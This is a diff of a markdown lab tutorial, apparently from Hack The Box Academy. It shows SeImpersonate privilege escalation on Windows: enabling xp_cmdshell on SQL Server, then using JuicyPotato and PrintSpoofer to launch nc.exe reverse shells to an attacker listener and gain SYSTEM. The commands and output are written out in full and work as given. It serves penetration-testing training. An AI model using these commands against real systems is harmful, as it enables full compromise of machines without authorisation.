@@ -20,8 +20,7 @@ In this scenario, the SQL Service service account is running in the context of t
 
 Using the credentials `sql_dev:Str0ng_P@ssw0rd!`, let's first connect to the SQL server instance and confirm our privileges. We can do this using [mssqlclient.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/mssqlclient.py) from the `Impacket` toolkit.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ mssqlclient.py sql_dev@10.129.43.30 -windows-auth
 
 Impacket v0.9.22.dev1+20200929.152157.fe642b24 - Copyright 2020 SecureAuth Corporation
@@ -42,8 +41,7 @@ SQL>
 
 Next, we must enable the `xp_cmdshell` stored procedure to run operating system commands. We can do this via the Impacket MSSSQL shell by typing `enable_xp_cmdshell`. Typing `help` displays a few other command options.
 
-```
-        shellsession
+```shellsession
 SQL> enable_xp_cmdshell
 
 [*] INFO(WINLPE-SRV01\SQLEXPRESS01): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
@@ -56,8 +54,7 @@ Note: We don't actually have to type `RECONFIGURE` as Impacket does this for us.
 
 With this access, we can confirm that we are indeed running in the context of a SQL Server service account.
 
-```
-        shellsession
+```shellsession
 SQL> xp_cmdshell whoami
 
 output                                                                             
@@ -71,8 +68,7 @@ nt service\mssql$sqlexpress01
 
 Next, let's check what privileges the service account has been granted.
 
-```
-        shellsession
+```shellsession
 SQL> xp_cmdshell whoami /priv
 
 output                                                                             
@@ -101,8 +97,7 @@ The command `whoami /priv` confirms that [SeImpersonatePrivilege](https://docs.m
 
 To escalate privileges using these rights, let's first download the `JuicyPotato.exe` binary and upload this and `nc.exe` to the target server. Next, stand up a Netcat listener on port 8443, and execute the command below where `-l` is the COM server listening port, `-p` is the program to launch (cmd.exe), `-a` is the argument passed to cmd.exe, and `-t` is the `createprocess` call. Below, we are telling the tool to try both the [CreateProcessWithTokenW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithtokenw) and [CreateProcessAsUser](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessasusera) functions, which need `SeImpersonate` or `SeAssignPrimaryToken` privileges respectively.
 
-```
-        shellsession
+```shellsession
 SQL> xp_cmdshell c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
 
 output                                                                             
@@ -121,8 +116,7 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 53375
 
 This completes successfully, and a shell as `NT AUTHORITY\SYSTEM` is received.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo nc -lnvp 8443
 
 listening on [any] 8443 ...
@@ -151,8 +145,7 @@ JuicyPotato doesn't work on Windows Server 2019 and Windows 10 build 1809 onward
 
 Let's try this out using the `PrintSpoofer` tool. We can use the tool to spawn a SYSTEM process in your current console and interact with it, spawn a SYSTEM process on a desktop (if logged on locally or via RDP), or catch a reverse shell - which we will do in our example. Again, connect with `mssqlclient.py` and use the tool with the `-c` argument to execute a command. Here, using `nc.exe` to spawn a reverse shell (with a Netcat listener waiting on our attack box on port 8443).
 
-```
-        shellsession
+```shellsession
 SQL> xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
 
 output                                                                             
@@ -172,8 +165,7 @@ NULL
 
 If all goes according to plan, we will have a SYSTEM shell on our netcat listener.
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ nc -lnvp 8443
 
 listening on [any] 8443 ...
